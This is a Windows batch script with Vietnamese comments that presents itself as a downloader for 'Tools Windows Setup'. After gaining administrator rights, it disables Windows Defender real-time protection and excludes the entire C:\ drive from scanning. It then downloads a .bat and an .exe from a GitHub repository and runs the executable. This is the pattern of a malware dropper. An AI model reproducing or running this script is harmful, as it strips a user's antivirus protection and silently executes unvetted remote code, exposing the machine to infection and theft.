@echo off
setlocal EnableExtensions

:: ========================
:: Đặt console ~600x400 (80x25 ký tự)
:: ========================
mode con cols=80 lines=25

:: Căn giữa màn hình bằng GetConsoleWindow + GetWindowRect + MoveWindow
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool GetWindowRect(IntPtr hWnd,out RECT lpRect);[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr hWnd,int X,int Y,int W,int H,bool Repaint);public struct RECT{public int Left;public int Top;public int Right;public int Bottom;}' -Name Win32 -Namespace Native; Add-Type -AssemblyName System.Windows.Forms; $hWnd=[Native.Win32]::GetConsoleWindow(); $r=New-Object Native.Win32+RECT; [Native.Win32]::GetWindowRect($hWnd,[ref]$r) | Out-Null; $w=$r.Right-$r.Left; $h=$r.Bottom-$r.Top; $sw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $sh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $x=($sw-$w)/2; $y=($sh-$h)/2; [Native.Win32]::MoveWindow($hWnd,$x,$y,$w,$h,$true)"

title Tat tam thoi Windows Defender + Tai file GitHub
color 0A

:: ========================
:: KIỂM TRA QUYỀN ADMIN
:: ========================
net session >nul 2>&1
if %errorlevel%==0 goto :ADMIN

powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; $msg='File nay can chay bang quyen Administrator. Ban co muon khoi dong lai voi quyen Admin khong?'; if ([System.Windows.Forms.MessageBox]::Show($msg,'Yeu cau quyen Admin','OKCancel','Warning') -eq 'OK') {Start-Process -FilePath '%~f0' -Verb RunAs}"
exit /b

:ADMIN
echo Dang chay voi quyen Admin.
echo.

:: ========================
:: TẮT TẠM THỜI DEFENDER
:: ========================
echo ⚙️ Dang tat tam thoi Windows Defender Real-Time Protection...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
echo ➜ Da gui lenh tat tam thoi (neu that bai, van tiep tuc tai file).
echo.

:: ========================
:: TẢI FILE TỪ GITHUB (NẾU CHƯA CÓ)
:: ========================
set "DESKTOP=%USERPROFILE%\Desktop"
set "FILE1=%DESKTOP%\Tools_Windows_Setup.bat"
set "FILE2=%DESKTOP%\Tools_Windows_Setup.exe"
set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.bat"
set "URL_EXE=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.exe"

if exist "%FILE1%" (
  echo [+] Da ton tai: Tools_Windows_Setup.bat
) else (
  echo 📥 Dang tai Tools_Windows_Setup.bat...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.bat
)

if exist "%FILE2%" (
  echo [+] Da ton tai: Tools_Windows_Setup.exe
) else (
  echo 📥 Dang tai Tools_Windows_Setup.exe...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_EXE%' -OutFile '%FILE2%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.exe
)
echo.

:: ========================
:: KIỂM TRA & MỞ FILE
:: ========================
if exist "%FILE1%" (
  echo [+] San sang: Tools_Windows_Setup.bat
) else (
  echo [-] Khong tim thay Tools_Windows_Setup.bat
)

if exist "%FILE2%" (
  echo [+] San sang: Tools_Windows_Setup.exe
  echo Dang mo Tools_Windows_Setup.exe...
  start "" "%FILE2%"
) else (
  echo [-] Khong tim thay Tools_Windows_Setup.exe
)

echo.
echo Hoan tat.
pause
endlocal
